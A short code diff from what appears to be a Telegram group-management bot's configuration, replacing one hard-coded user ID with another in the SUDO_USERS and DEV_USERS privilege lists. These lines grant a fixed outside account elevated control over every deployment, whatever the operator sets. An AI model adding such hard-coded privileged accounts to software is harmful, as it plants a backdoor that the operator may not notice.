@@ -142,13 +142,13 @@ else:
     
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1393551785)
+SUDO_USERS.add(1367484916)
 
 DEV_USERS.add(OWNER_ID)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
-DEV_USERS.add(1393551785)
+DEV_USERS.add(1367484916)
 SUDO_USERS = list(SUDO_USERS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WHITELIST_USERS = list(WHITELIST_USERS)
